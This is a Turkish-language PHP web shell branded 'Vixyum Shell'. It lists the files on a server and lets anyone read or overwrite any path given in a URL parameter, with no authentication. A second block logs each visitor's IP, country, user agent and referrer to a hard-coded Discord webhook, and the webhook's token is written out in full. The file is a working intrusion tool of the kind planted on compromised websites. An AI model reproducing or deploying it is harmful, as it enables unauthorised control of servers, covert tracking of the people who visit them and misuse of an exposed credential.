
<html>
<head>
    <title>Dosya Yönetimi</title>
    <style>
        /* Genel Stiller */
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            padding: 20px;
        }
        h1 {
            color: #e11a00;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            margin-bottom: 10px;
            background-color: #880808;
            padding: 10px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        a {
            text-decoration: none;
            color: red;
            font-family: Calibri;
            font-size: 23px;
            text-align: Justify;
        }
        a:hover {
            color: #999;
            text-decoration: underline;
        }
    </style>
    <link rel="stylesheet" type="text/css" href="custom.css">
</head>
<body>
    <h1>root@kali - Vixyum Shell</h1>

    <?php
    // Dosyaların listeleneceği dizin
    $directory = './';

    if (isset($_GET['file'])) {
        $file_path = $_GET['file'];
        $file_content = '';

        // Dosyayı oku
        if (file_exists($file_path)) {
            $file_content = file_get_contents($file_path);
        }

        // Form gönderildiğinde dosyayı kaydet
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $new_content = $_POST['content'];
            if (file_put_contents($file_path, $new_content)) {
                echo '<p>Dosya başarıyla kaydedildi.</p>';
                $file_content = $new_content;
            } else {
                echo '<p>Dosya kaydedilirken bir hata oluştu.</p>';
            }
        }

        // Dosya düzenleme formunu göster
        echo '<h2>Dosya Düzenleme: ' . $file_path . '</h2>';
        echo '<form method="POST">';
        echo '<textarea name="content" rows="10" cols="80">' . htmlspecialchars($file_content) . '</textarea><br>';
        echo '<input type="submit" value="Kaydet">';
        echo '</form>';
    } else {
        // Dizindeki dosyaları al
        $files = scandir($directory);

        if ($files !== false) {
            // Liste oluştur
            echo '<ul>';
            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $file_path = $directory . $file;
                    if (is_file($file_path)) {
                        $file_extension = pathinfo($file_path, PATHINFO_EXTENSION);
                        if (in_array($file_extension, ['php', 'html', 'css', 'mp3'])) {
                            echo '<li><a href="?file=' . urlencode($file_path) . '">' . $file . '</a></li>';
                        }
                    }
                }
            }
            echo '</ul>';
        } else {
            echo '<p>Dizin içinde dosya bulunamadı.</p>';
        }
    }
    ?>
</body>
</html>

<?php

// Discord Webhook URL'si
$webhook_url = "https://discord.com/api/webhooks/1124143262358315028/ayJH8gN0T0hqWaPSOnhaiSBS04G-L6Evfo5svXobp2q8ka6_1KC6GDDjx1W_J9C7rllL";

// Kullanıcının IP adresini al
$user_ip = $_SERVER['REMOTE_ADDR'];

// VPN Sunucularının IP adresleri
$vpn_servers = array(
    '1.2.3.4',
    '5.6.7.8',
    '9.10.11.12'
);

// Kullanıcının tarayıcı bilgilerini, işletim sistemi ve dil ayarlarını al
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// IP coğrafi konumunu almak için API isteği gönder
$ip_info = json_decode(file_get_contents("http://ip-api.com/json/{$user_ip}"));

// Kullanıcının VPN kullanıp kullanmadığını kontrol et
$is_vpn = in_array($user_ip, $vpn_servers);

// Kullanıcının girdiği sayfanın URL'sini al
$page_url = $_SERVER['HTTP_REFERER'];

// Log mesajı oluştur
$log_message = array(
    "content" => "",
    "embeds" => array(
        array(
            "title" => "Shell'e biri girdi !",
            "color" => hexdec("c00c00"),
            "fields" => array(
                array(
                    "name" => "IP Adresi",
                    "value" => $user_ip
                ),
                array(
                    "name" => "Ülke",
                    "value" => $ip_info->country ?? 'Bilinmiyor'
                ),
                array(
                    "name" => "VPN Kullanıyor",
                    "value" => $is_vpn ? 'Evet' : 'Hayır'
                ),
                array(
                    "name" => "Tarayıcı Bilgileri",
                    "value" => $user_agent
                ),
                array(
                    "name" => "Girilen Sayfa",
                    "value" => $page_url
                )
            )
        )
    )
);

// Discord kanalına log mesajı gönder
$options = array(
    "http" => array(
        "header"  => "Content-Type: application/json",
        "method"  => "POST",
        "content" => json_encode($log_message),
    ),
);
$context  = stream_context_create($options);
$result = file_get_contents($webhook_url, false, $context);

?>
